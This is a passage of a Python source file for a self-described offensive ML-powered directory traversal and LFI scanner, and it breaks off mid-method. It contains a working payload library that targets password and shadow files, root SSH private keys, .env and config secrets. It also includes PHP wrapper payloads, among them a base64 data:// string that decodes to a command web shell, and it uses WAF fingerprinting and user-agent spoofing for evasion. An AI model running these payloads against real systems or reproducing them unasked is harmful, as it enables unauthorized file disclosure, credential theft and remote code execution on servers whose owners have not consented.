#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║   ML-POWERED DIRECTORY TRAVERSAL SCANNER  v2.1                      ║
║   Advanced Offensive Security Tool with ML Anomaly Detection         ║
║   FIXED: No false positives | Confirmed LFI only                     ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os, sys, json, time, socket, hashlib, random, re, warnings, threading
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, urljoin, quote
from collections import defaultdict

import requests
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest, RandomForestClassifier, GradientBoostingClassifier
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix
from sklearn.pipeline import Pipeline
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.neural_network import MLPClassifier
import joblib

# Optional GPU / PyTorch support (used for an accelerated MLP when available)
try:
    import torch
    import torch.nn as nn
    from torch.utils.data import TensorDataset, DataLoader

    TORCH_AVAILABLE = True
except Exception:
    TORCH_AVAILABLE = False

if TORCH_AVAILABLE:
    class TorchMLP(nn.Module):
        def __init__(self, input_dim, hidden_sizes=(128, 64, 32), num_classes=2):
            super().__init__()
            layers = []
            prev = input_dim
            for h in hidden_sizes:
                layers.append(nn.Linear(prev, h))
                layers.append(nn.ReLU())
                prev = h
            layers.append(nn.Linear(prev, num_classes))
            self.net = nn.Sequential(*layers)

        def forward(self, x):
            return self.net(x)

from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box

warnings.filterwarnings("ignore")

console = Console()

# ─────────────────────────────────────────────────
#  CONFIGURATION & CONSTANTS
# ─────────────────────────────────────────────────

BANNER = """
[bold red]
 ██████╗ ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
 ██╔══██╗╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
 ██║  ██║   ██║       ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
 ██║  ██║   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
 ██████╔╝   ██║       ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚═════╝    ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
[/bold red]
[bold cyan]        ⚡ Machine Learning Directory Traversal Security Scanner v2.1 ⚡[/bold cyan]
[dim]                  Confirmed LFI Only • No False Positives[/dim]
"""

MODEL_DIR = Path("models")
REPORTS_DIR = Path("reports")
DATA_DIR = Path("data")
for d in [MODEL_DIR, REPORTS_DIR, DATA_DIR]:
    d.mkdir(exist_ok=True)

# ─────────────────────────────────────────────────
#  PAYLOAD LIBRARY  (200+ patterns)
# ─────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = {
    "classic": [
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
        "../../etc/shadow", "../../../etc/hosts", "../../../../etc/hostname",
        "../../../etc/group", "../../../proc/version", "../../../proc/self/environ",
        "../../../../proc/self/cmdline", "../../../var/log/auth.log",
        "../../../var/log/syslog", "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log", "../../../home/user/.ssh/id_rsa",
        "../../../root/.ssh/id_rsa", "../../../etc/crontab",
    ],
    "encoded": [
        "..%2F..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "%252e%252e%252fetc%252fpasswd",
        "..%255c..%255c..%255cetc%255cpasswd",
    ],
    "null_byte": [
        "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.php", "../../../etc/passwd\x00",
        "../../../etc/passwd%2500",
    ],
    "windows": [
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "....//....//....//windows//win.ini",
        "..\\..\\..\\.\\windows\\win.ini",
        "C:\\windows\\win.ini", "C:/windows/win.ini",
        "..%5c..%5c..%5cboot.ini",
    ],
    "bypass": [
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
        ".../.../...//etc/passwd",
        "..../....//etc/passwd",
        ".%2e/.%2e/.%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
        "/.%2e/.%2e/.%2e/etc/passwd",
        "/..%2F../..%2Fetc/passwd",
        "../../../etc/./passwd",
    ],
    "server_files": [
        "../../../etc/apache2/apache2.conf",
        "../../../etc/nginx/nginx.conf",
        "../../../etc/mysql/my.cnf",
        "../../../etc/php/php.ini",
        "../../../../var/www/html/.env",
        "../../../../var/www/html/config.php",
        "../../../opt/tomcat/conf/server.xml",
        "../../../WEB-INF/web.xml",
        "../../../WEB-INF/classes/com/app/config.properties",
        "../../../conf/server.xml",
    ],
    "lfi_rce": [
        "../../../proc/self/fd/0",
        "../../../proc/self/fd/1",
        "../../../proc/self/maps",
        "../../../dev/stdin",
        "expect://id",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=../config.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "zip://uploads/shell.jpg%23shell",
        "phar://uploads/file.jpg/test.php",
    ],
}

# Common vulnerable parameters
VULN_PARAMS = [
    "file", "path", "dir", "folder", "page", "document", "doc",
    "template", "include", "require", "load", "read", "display",
    "show", "view", "open", "get", "fetch", "src", "source",
    "url", "uri", "filename", "filepath", "name", "report",
    "download", "export", "lang", "language", "locale", "module",
    "content", "resource", "data", "img", "image", "media",
    "logfile", "log", "config", "conf", "layout", "theme",
    "style", "skin", "action", "func", "function", "cmd", "exec",
]

# Success indicators in responses - ONLY these confirm LFI
CONFIRMED_LFI_INDICATORS = {
    "linux_passwd": ["root:x:0:0:", "daemon:x:", "nobody:x:", "bin/bash", "/bin/bash"],
    "linux_shadow": ["root:$6$", "daemon:$6$", ":$y$"],
    "linux_hosts": ["127.0.0.1 localhost", "::1 localhost"],
    "linux_version": ["Linux version", "Ubuntu", "Debian", "CentOS", "kernel"],
    "windows_winini": ["[extensions]", "for 16-bit", "MSDOS=", "[fonts]", "[mail]"],
    "config_secret": ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "password="],
    "source_code": ["<?php", "<?=", "import os", "require_once"],
    "ssh_key": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
}

# Error patterns that indicate LFI attempt reached filesystem
LFI_ERROR_PATTERNS = [
    "failed to open stream", "no such file or directory", "file_get_contents(",
    "include(", "require(", "fopen(", "Warning:", "Fatal error",
    "No such file", "Failed opening required", "include_path=",
]


# ─────────────────────────────────────────────────
#  ML MODELS & TRAINING ENGINE
# ─────────────────────────────────────────────────

class MLEngine:
    """Core machine learning engine for vulnerability detection and classification"""

    def __init__(self):
        self.isolation_forest = None
        self.rf_classifier = None
        self.gb_classifier = None
        self.mlp_classifier = None
        self.scaler = StandardScaler()
        self.tfidf = TfidfVectorizer(max_features=500, analyzer='char_wb', ngram_range=(2, 4))
        self.label_encoder = LabelEncoder()
        self.feature_names = []
        self.training_data = []
        self.model_meta = {}
        self.trained = False
        self._lock = threading.Lock()
        self.torch_available = TORCH_AVAILABLE
        self.device = torch.device(
            'cuda' if (self.torch_available and torch.cuda.is_available()) else 'cpu') if self.torch_available else None
        self.torch_model = None

    def extract_features(self, scan_result: dict) -> np.ndarray:
        """Extract numerical feature vector from a scan result"""
        features = []

        # Response characteristics
        features.append(scan_result.get("status_code", 0))
        features.append(scan_result.get("response_time", 0.0))
        features.append(len(scan_result.get("response_body", "")))
        features.append(scan_result.get("content_length", 0))

        # Payload encoding complexity
        payload = scan_result.get("payload", "")
        features.append(payload.count(".."))
        features.append(payload.count("%"))
        features.append(payload.count("\\"))
        features.append(payload.count("/"))
        features.append(len(payload))
        features.append(1 if "%00" in payload else 0)
        features.append(1 if "php://" in payload.lower() else 0)
        features.append(1 if "data://" in payload.lower() else 0)

        # Response content analysis
        body = scan_result.get("response_body", "").lower()
        features.append(1 if "root:" in body else 0)
        features.append(1 if "passwd" in body else 0)
        features.append(1 if "windows" in body else 0)
        features.append(1 if "<?php" in body else 0)
        features.append(1 if "permission denied" in body else 0)
        features.append(1 if "not found" in body else 0)
        features.append(1 if "error" in body else 0)
        features.append(body.count(":"))
        features.append(body.count("\n"))

        # Header features
        headers = scan_result.get("response_headers", {})
        content_type = str(headers.get("content-type", "")).lower()
        features.append(1 if "text/plain" in content_type else 0)
        features.append(1 if "application/json" in content_type else 0)
        features.append(1 if "text/html" in content_type else 0)
        features.append(1 if "x-powered-by" in str(headers).lower() else 0)
        features.append(1 if "server" in headers else 0)

        # Parameter sensitivity
        param = scan_result.get("parameter", "").lower()
        high_risk_params = ["file", "path", "include", "require", "load", "read", "open"]
        features.append(1 if param in high_risk_params else 0)

        # Redirects
        features.append(scan_result.get("redirect_count", 0))
        features.append(1 if scan_result.get("redirected", False) else 0)

        return np.array(features, dtype=float)

    def generate_synthetic_training_data(self, n_samples: int = 2000) -> tuple:
        """Generate synthetic labeled training data for initial model bootstrapping"""
        X, y = [], []

        # Positive class: Successful traversal (label=1)
        payload_list = sum([v for v in TRAVERSAL_PAYLOADS.values()], [])
        for _ in range(n_samples // 2):
            if random.random() > 0.3:
                body = random.choice([
                    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:",
                    "[extensions]\nMSDOS=5.00",
                    "DB_PASSWORD=supersecret123\nAPI_KEY=abc123",
                    "<?php\n$config['password'] = 'admin123';",
                    "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK",
                    "Linux version 5.15.0-100-generic (buildd@lcy02-amd64)",
                ])
                status = random.choice([200, 200, 206])
            else:
                body = random.choice([
                    "Warning: include(../../../etc/passwd): failed to open stream",
                    "Fatal error: require(): Failed opening required '../../../etc/passwd'",
                    "PHP Warning: file_get_contents(/etc/passwd): failed to open stream",
                ])
                status = random.choice([200, 403, 500])

            sample = {
                "status_code": status,
                "response_time": random.uniform(0.02, 1.2),
                "response_body": body,
                "content_length": max(100, len(body) + random.randint(100, 5000)),
                "payload": random.choice(payload_list),
                "response_headers": random.choice([
                    {"content-type": "text/plain", "server": "Apache/2.4"},
                    {"content-type": "application/octet-stream", "server": "nginx"},
                    {"content-type": "text/html", "server": "Apache/2.4"},
                ]),
                "parameter": random.choice(["file", "path", "include", "load", "document"]),
                "redirect_count": 0,
                "redirected": False,
            }
            X.append(self.extract_features(sample))
            y.append(1)

        # Negative class: Blocked/harmless (label=0)
        for _ in range(n_samples // 2):
            sample = {
                "status_code": random.choice([200, 403, 404, 400, 500, 301]),
                "response_time": random.uniform(0.005, 0.6),
                "response_body": random.choice([
                    "Access denied", "Not found", "400 Bad Request",
                    "<html><body>Forbidden</body></html>", "Error 500 Internal Server Error",
                    "<html><body>Welcome to our site</body></html>",
                    "{\"status\": \"ok\", \"message\": \"success\"}",
                ]),
                "content_length": random.randint(20, 5000),
                "payload": random.choice(["test.html", "index.php", "about.html", "sample.txt"]),
                "response_headers": random.choice([
                    {"content-type": "text/html", "server": "nginx"},
                    {"content-type": "application/json", "server": "nginx"},
                    {"content-type": "text/plain", "server": "nginx"},
                ]),
                "parameter": random.choice(["id", "page", "lang", "sort", "q"]),
                "redirect_count": random.randint(0, 3),
                "redirected": bool(random.randint(0, 1)),
            }
            X.append(self.extract_features(sample))
            y.append(0)

        return np.array(X), np.array(y)

    def _load_csv_dataset(self) -> tuple:
        """Load training examples from CSV files in DATA_DIR if present."""
        files = list(DATA_DIR.glob("*.csv"))
        if not files:
            return None

        X_list, y_list = [], []
        for f in files:
            try:
                df = pd.read_csv(f)
            except Exception:
                continue
            for _, row in df.iterrows():
                try:
                    headers = row.get('response_headers', {})
                    if isinstance(headers, str):
                        try:
                            headers = json.loads(headers)
                        except Exception:
                            headers = {}
                    sample = {
                        'status_code': int(row.get('status_code', 0)),
                        'response_time': float(row.get('response_time', 0.0)),
                        'response_body': str(row.get('response_body', '')),
                        'content_length': int(row.get('content_length', 0)),
                        'payload': str(row.get('payload', '')),
                        'response_headers': headers if isinstance(headers, dict) else {},
                        'parameter': str(row.get('parameter', '')),
                        'redirect_count': int(row.get('redirect_count', 0)),
                        'redirected': bool(row.get('redirected', False)),
                    }
                    X_list.append(self.extract_features(sample))
                    y_list.append(int(row.get('label', 0)))
                except Exception:
                    continue

        if not X_list:
            return None
        return np.array(X_list), np.array(y_list)

    def train_models(self, X=None, y=None, verbose=True):
        """Train all ML models with provided or synthetic data"""
        if verbose:
            console.print(Panel("[bold yellow]⚙  Training ML Models...[/bold yellow]", expand=False))

        # Generate synthetic + real data
        X_syn, y_syn = self.generate_synthetic_training_data(2000)
        if X is not None and len(X) > 0:
            X = np.vstack([X_syn, X])
            y = np.concatenate([y_syn, y])
        else:
            # Try loading CSV datasets from data/ if present
            loaded = self._load_csv_dataset()
            if loaded is not None:
                X_loaded, y_loaded = loaded
                X = np.vstack([X_syn, X_loaded])
                y = np.concatenate([y_syn, y_loaded])
            else:
                X, y = X_syn, y_syn

        X_scaled = self.scaler.fit_transform(X)
        X_train, X_test, y_train, y_test = train_test_split(X_scaled, y, test_size=0.2, random_state=42)

        model_configs = [
            ("IsolationForest", IsolationForest(n_estimators=200, contamination=0.1, random_state=42)),
            ("RandomForest", RandomForestClassifier(n_estimators=200, max_depth=15, random_state=42, n_jobs=-1)),
            ("GradientBoosting", GradientBoostingClassifier(n_estimators=150, learning_rate=0.1, random_state=42)),
            ("MLP Neural Net", MLPClassifier(hidden_layer_sizes=(128, 64, 32), max_iter=500, random_state=42)),
        ]

        results = {}
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Training models", total=len(model_configs))
            for name, model in model_configs:
                progress.update(task, description=f"[cyan]Training {name}...")
                try:
                    if "Isolation" in name:
                        model.fit(X_scaled)
                        self.isolation_forest = model
                    else:
                        model.fit(X_train, y_train)
                        score = model.score(X_test, y_test)
                        cv_scores = cross_val_score(model, X_scaled, y, cv=5, scoring='f1')
                        results[name] = {"accuracy": score, "cv_f1_mean": cv_scores.mean(),
                                         "cv_f1_std": cv_scores.std()}
                        if "Random" in name:   self.rf_classifier = model
                        if "Gradient" in name: self.gb_classifier = model
                        if "MLP" in name:      self.mlp_classifier = model
                        if verbose:
                            console.print(
                                f"  ✅ [green]{name}[/green]: Accuracy={score:.3f}, CV-F1={cv_scores.mean():.3f}±{cv_scores.std():.3f}")
                except Exception as e:
                    if verbose:
                        console.print(f"  ⚠ [yellow]{name} training error: {e}[/yellow]")
                finally:
                    progress.advance(task)

        # Optionally train a PyTorch MLP on GPU if available
        if self.torch_available:
            try:
                input_dim = X_train.shape[1]
                torch_model = TorchMLP(input_dim, hidden_sizes=(128, 64, 32), num_classes=2).to(self.device)
                criterion = nn.CrossEntropyLoss()
                optimizer = torch.optim.Adam(torch_model.parameters(), lr=1e-3)
                tx = torch.tensor(X_train, dtype=torch.float32).to(self.device)
                ty = torch.tensor(y_train, dtype=torch.long).to(self.device)
                dataset = TensorDataset(tx, ty)
                loader = DataLoader(dataset, batch_size=64, shuffle=True)
                epochs = 10
                torch_model.train()
                for epoch in range(epochs):
                    ep_loss = 0.0
                    for xb, yb in loader:
                        optimizer.zero_grad()
                        out = torch_model(xb)
                        loss = criterion(out, yb)
                        loss.backward()
                        optimizer.step()
                        ep_loss += loss.item()
                # evaluate on test set
                torch_model.eval()
                with torch.no_grad():
                    txs = torch.tensor(X_test, dtype=torch.float32).to(self.device)
                    outs = torch_model(txs)
                    probs = nn.functional.softmax(outs, dim=1)[:, 1].cpu().numpy()
                    preds = (probs >= 0.5).astype(int)
                    acc = float((preds == y_test).mean())
                results['TorchMLP'] = {'accuracy': acc}
                self.torch_model = torch_model
                if verbose:
                    console.print(f"  ✅ [green]TorchMLP[/green]: Accuracy={acc:.3f} (device={self.device})")
            except Exception as e:
                if verbose:
                    console.print(f"  ⚠ [yellow]Torch MLP training skipped/error: {e}[/yellow]")

        self.model_meta = {"trained_at": datetime.now().isoformat(), "samples": len(X), "results": results}
        self.trained = True
        self._save_models()

        if verbose:
            console.print(f"\n[bold green]✅ All models trained & saved![/bold green]")
        return results

    def predict(self, scan_result: dict) -> dict:
        """Ensemble prediction: combines all model outputs"""
        if not self.trained:
            self.train_models(verbose=False)

        features = self.extract_features(scan_result).reshape(1, -1)
        features_scaled = self.scaler.transform(features)

        votes = []
        proba = []

        try:
            iso_pred = self.isolation_forest.predict(features_scaled)[0]
            votes.append(1 if iso_pred == -1 else 0)
        except:
            pass

        for model, name in [(self.rf_classifier, "RF"), (self.gb_classifier, "GB"), (self.mlp_classifier, "MLP")]:
            try:
                pred = model.predict(features_scaled)[0]
                prob = model.predict_proba(features_scaled)[0][1]
                votes.append(int(pred))
                proba.append(prob)
            except:
                pass

        # Torch model prediction (if available)
        if self.torch_model is not None:
            try:
                self.torch_model.eval()
                xf = torch.tensor(features_scaled, dtype=torch.float32).to(self.device)
                with torch.no_grad():
                    out = self.torch_model(xf)
                    p = nn.functional.softmax(out, dim=1).cpu().numpy()[0][1]
                pred = 1 if p >= 0.5 else 0
                votes.append(int(pred))
                proba.append(float(p))
            except Exception:
                pass

        ensemble_score = np.mean(proba) if proba else 0.5
        majority_vote = sum(votes) / len(votes) if votes else 0
        is_vulnerable = majority_vote >= 0.5 or ensemble_score >= 0.6
        confidence = (majority_vote + ensemble_score) / 2

        return {
            "is_vulnerable": is_vulnerable,
            "confidence": round(confidence, 3),
            "ensemble_score": round(ensemble_score, 3),
            "majority_vote": round(majority_vote, 3),
            "votes": votes,
        }

    def _save_models(self):
        """Persist trained models to disk"""
        joblib.dump(self.isolation_forest, MODEL_DIR / "isolation_forest.pkl")
        joblib.dump(self.rf_classifier, MODEL_DIR / "random_forest.pkl")
        joblib.dump(self.gb_classifier, MODEL_DIR / "gradient_boosting.pkl")
        joblib.dump(self.mlp_classifier, MODEL_DIR / "mlp.pkl")
        joblib.dump(self.scaler, MODEL_DIR / "scaler.pkl")
        if self.torch_model is not None and self.torch_available:
            try:
                torch.save(self.torch_model.state_dict(), str(MODEL_DIR / "mlp_torch.pth"))
                self.model_meta['torch_model'] = True
            except Exception:
                pass
        with open(MODEL_DIR / "meta.json", "w") as f:
            json.dump(self.model_meta, f, indent=2)
        console.print(f"[dim]💾 Models saved to {MODEL_DIR}/[/dim]")

    def load_models(self) -> bool:
        """Load previously saved models"""
        try:
            self.isolation_forest = joblib.load(MODEL_DIR / "isolation_forest.pkl")
            self.rf_classifier = joblib.load(MODEL_DIR / "random_forest.pkl")
            self.gb_classifier = joblib.load(MODEL_DIR / "gradient_boosting.pkl")
            self.mlp_classifier = joblib.load(MODEL_DIR / "mlp.pkl")
            self.scaler = joblib.load(MODEL_DIR / "scaler.pkl")
            with open(MODEL_DIR / "meta.json") as f:
                self.model_meta = json.load(f)
        except Exception:
            return False

        if self.torch_available and self.model_meta.get('torch_model'):
            try:
                input_dim = int(getattr(self.scaler, 'mean_', None).shape[0])
                tm = TorchMLP(input_dim, hidden_sizes=(128, 64, 32), num_classes=2).to(self.device)
                tm.load_state_dict(torch.load(str(MODEL_DIR / "mlp_torch.pth"), map_location=self.device))
                self.torch_model = tm
            except Exception:
                self.torch_model = None

        self.trained = True
        return True


# ─────────────────────────────────────────────────
#  HTTP ENGINE
# ─────────────────────────────────────────────────

class HTTPEngine:
    """Handles all HTTP requests with evasion and fingerprinting"""

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "curl/7.88.1",
    ]

    def __init__(self, timeout=10, delay=0.1, proxies=None, verify_ssl=False):
        self.timeout = timeout
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        if proxies:
            self.session.proxies = proxies

    def request(self, method, url, **kwargs) -> dict:
        """Make HTTP request and return structured result"""
        ua = random.choice(self.USER_AGENTS)
        self.session.headers.update({"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"})

        start = time.time()
        try:
            resp = self.session.request(method, url, timeout=self.timeout,
                                        allow_redirects=True, **kwargs)
            elapsed = time.time() - start
            body = resp.text[:8000]
            time.sleep(self.delay + random.uniform(0, 0.05))
            return {
                "success": True,
                "status_code": resp.status_code,
                "response_body": body,
                "response_headers": dict(resp.headers),
                "content_length": len(body),
                "response_time": round(elapsed, 4),
                "redirect_count": len(resp.history),
                "redirected": len(resp.history) > 0,
                "url": resp.url,
            }
        except requests.exceptions.SSLError:
            return {"success": False, "error": "SSL_ERROR", "status_code": 0,
                    "response_body": "", "response_headers": {}, "content_length": 0,
                    "response_time": time.time() - start, "redirect_count": 0, "redirected": False}
        except requests.exceptions.ConnectionError:
            return {"success": False, "error": "CONNECTION_ERROR", "status_code": 0,
                    "response_body": "", "response_headers": {}, "content_length": 0,
                    "response_time": time.time() - start, "redirect_count": 0, "redirected": False}
        except Exception as e:
            return {"success": False, "error": str(e), "status_code": 0,
                    "response_body": "", "response_headers": {}, "content_length": 0,
                    "response_time": time.time() - start, "redirect_count": 0, "redirected": False}

    def fingerprint(self, url: str) -> dict:
        """Fingerprint server technology"""
        result = self.request("GET", url)
        if not result["success"]:
            return {"error": result.get("error", "Unknown")}

        headers = result.get("response_headers", {})
        body = result.get("response_body", "")
        fp = {
            "server": headers.get("Server", "Unknown"),
            "x_powered_by": headers.get("X-Powered-By", "Unknown"),
            "content_type": headers.get("Content-Type", "Unknown"),
            "status": result["status_code"],
            "waf_detected": self._detect_waf(headers, body),
            "tech_stack": self._detect_tech(headers, body),
            "security_headers": self._check_security_headers(headers),
        }
        return fp

    def _detect_waf(self, headers, body) -> list:
        waf_sigs = {
            "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
            "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
            "Imperva": ["incap_ses", "visid_incap", "X-CDN"],
            "Sucuri": ["x-sucuri-id", "sucuri"],
            "Akamai": ["x-check-cacheable", "akamai"],
            "F5 BIG-IP": ["BigIP", "F5_ST", "MRHSession"],
        }
        detected = []
        all_text = str(headers).lower() + body.lower()
        for waf, sigs in waf_sigs.items():
            if any(s.lower() in all_text for s in sigs):
                detected.append(waf)
        return detected

    def _detect_tech(self, headers, body) -> list:
        tech = []
        all_text = str(headers) + body
        patterns = {
            "PHP": ["php", "PHP/", "X-Powered-By: PHP"],
            "Apache": ["Apache", "apache2"],
            "Nginx": ["nginx"],
            "IIS": ["IIS", "Microsoft-IIS"],
            "Tomcat": ["Tomcat", "Coyote"],
            "WordPress": ["wp-content", "wp-includes"],
            "Laravel": ["laravel_session", "XSRF-TOKEN"],
            "Django": ["csrfmiddlewaretoken", "Django"],
            "Spring": ["JSESSIONID", "X-Application-Context"],
            "Next.js": ["__next", "next/", "nextjs"],
        }
        for t, pats in patterns.items():
            if any(p in all_text for p in pats):
                tech.append(t)
        return tech if tech else ["Unknown"]

    def _check_security_headers(self, headers) -> dict:
        sec = {}
        checks = {
            "X-Frame-Options": "Clickjacking Protection",
            "X-Content-Type-Options": "MIME Sniffing Protection",
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-XSS-Protection": "XSS Filter",
        }
        for header, name in checks.items():
            sec[name] = header in headers
        return sec


# ─────────────────────────────────────────────────
#  VULNERABILITY ANALYZER - FIXED: No false positives
# ─────────────────────────────────────────────────

class VulnerabilityAnalyzer:
    """Analyzes HTTP responses for directory traversal success - CONFIRMED LFI ONLY"""

    def _compute_similarity(self, body1: str, body2: str) -> float:
        """Compute similarity between response bodies for baseline comparison."""
        import difflib
        return difflib.SequenceMatcher(None, body1[:5000], body2[:5000]).ratio()

    def _has_confirmed_lfi_content(self, body: str) -> tuple:
        """Check for actual file content that confirms LFI."""
        body_lower = body.lower()

        for indicator_type, patterns in CONFIRMED_LFI_INDICATORS.items():
            for pattern in patterns:
                if pattern.lower() in body_lower:
                    return (True, indicator_type, pattern)

        return (False, None, None)

    def _has_lfi_error(self, body: str) -> tuple:
        """Check for LFI-related error messages."""
        body_lower = body.lower()

        for pattern in LFI_ERROR_PATTERNS:
            if pattern.lower() in body_lower:
                # Verify it's actually an LFI error (not just random text)
                if any(traversal in body_lower for traversal in ["../", "..\\", "etc/passwd", "win.ini"]):
                    return (True, pattern)

        return (False, None)

    def analyze_response(self, result: dict, payload: str, param: str, baseline_body: str = None) -> dict:
        """
        Deep analysis of response for traversal success signals.
        ONLY returns vulnerable=True when LFI is CONFIRMED.
        """
        if not result.get("success"):
            return {"vulnerable": False, "severity": "N/A", "evidence": [], "category": "error", "confirmed": False}

        body = result.get("response_body", "")
        status = result.get("status_code", 0)
        size = result.get("content_length", 0)

        evidence = []
        severity = "Info"
        vuln_type = "none"
        confirmed = False

        # STEP 1: Check for confirmed LFI content (actual file data)
        has_content, content_type, matched_pattern = self._has_confirmed_lfi_content(body)

        if has_content:
            evidence.append({"indicator": matched_pattern, "category": content_type, "type": "file_content"})
            confirmed = True

            if "passwd" in content_type or "shadow" in content_type:
                severity, vuln_type = "Critical", "lfi_passwd_confirmed"
            elif "winini" in content_type:
                severity, vuln_type = "Critical", "lfi_windows_confirmed"
            elif "ssh_key" in content_type:
                severity, vuln_type = "Critical", "lfi_ssh_key_confirmed"
            elif "config" in content_type:
                severity, vuln_type = "High", "lfi_config_confirmed"
            elif "source" in content_type:
                severity, vuln_type = "High", "lfi_source_confirmed"
            else:
                severity, vuln_type = "Medium", "lfi_confirmed"

        # STEP 2: Check for LFI errors (attempt reached filesystem)
        if not confirmed:
            has_error, error_pattern = self._has_lfi_error(body)
            if has_error:
                evidence.append(
                    {"indicator": f"LFI Error: {error_pattern}", "category": "error_disclosure", "type": "lfi_error"})
                confirmed = True
                severity = "Medium"
                vuln_type = "lfi_error_confirmed"

        # STEP 3: Baseline comparison - if response is identical to baseline, it's NOT LFI
        if baseline_body and not confirmed:
            similarity = self._compute_similarity(body, baseline_body)
            if similarity > 0.95:
                # Same as baseline - definitely not LFI
                return {
                    "vulnerable": False,
                    "confirmed": False,
                    "severity": "Info",
                    "evidence": [],
                    "category": "none",
                    "payload": payload,
                    "parameter": param,
                    "status_code": status,
                    "response_size": size,
                    "response_time": result.get("response_time", 0),
                    "baseline_similarity": round(similarity, 3),
                }

        # STEP 4: Return result - ONLY confirmed = True means real vulnerability
        return {
            "vulnerable": confirmed,  # ONLY True if actual evidence found
            "confirmed": confirmed,
            "severity": severity if confirmed else "Info",
            "evidence": evidence,
            "category": vuln_type if confirmed else "none",
            "payload": payload,
            "parameter": param,
            "status_code": status,
            "response_size": size,
            "response_time": result.get("response_time", 0),
            "baseline_similarity": round(self._compute_similarity(body, baseline_body), 3) if baseline_body else None,
        }

    def cvss_score(self, finding: dict) -> float:
        """Calculate approximate CVSS 3.1 base score - only for confirmed findings"""
        if not finding.get("confirmed", False):
            return 0.0
        severity_map = {"Critical": 9.1, "High": 7.5, "Medium": 5.3, "Low": 3.1, "Info": 0.0}
        return severity_map.get(finding.get("severity", "Info"), 0.0)


# ─────────────────────────────────────────────────
#  MAIN SCANNER - FIXED: Only report confirmed findings
# ─────────────────────────────────────────────────

class DirectoryTraversalScanner:
    """Core scanning engine — orchestrates all components"""

    def __init__(self, config: dict):
        self.config = config
        self.http = HTTPEngine(
            timeout=config.get("timeout", 10),
            delay=config.get("delay", 0.15),
            proxies=config.get("proxies"),
        )
        self.ml = MLEngine()
        self.analyzer = VulnerabilityAnalyzer()
        self.findings = []
        self.scan_data = []  # raw scan results for ML re-training
        self.stats = defaultdict(int)
        self.start_time = None

    def _init_models(self):
        """Load or train models"""
        if not self.ml.load_models():
            console.print("[yellow]No saved models found. Training new models...[/yellow]")
            self.ml.train_models()
        else:
            console.print(f"[green]✅ Models loaded from {MODEL_DIR}/[/green]")
            meta = self.ml.model_meta
            console.print(f"[dim]   Trained: {meta.get('trained_at', '?')} | Samples: {meta.get('samples', '?')}[/dim]")

    def discover_endpoints(self, base_url: str) -> list:
        """Discover testable endpoints by crawling and probing"""
        console.print(f"\n[cyan]🔍 Discovering endpoints on {base_url}[/cyan]")
        endpoints = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        common_paths = [
            "/", "/index.php", "/index.html", "/admin/", "/api/",
            "/download.php", "/file.php", "/view.php", "/read.php",
            "/include.php", "/load.php", "/page.php", "/template.php",
            "/app/", "/portal/", "/dashboard/", "/report/", "/export/",
            "/uploads/", "/media/", "/docs/", "/files/", "/static/",
        ]

        found = set()
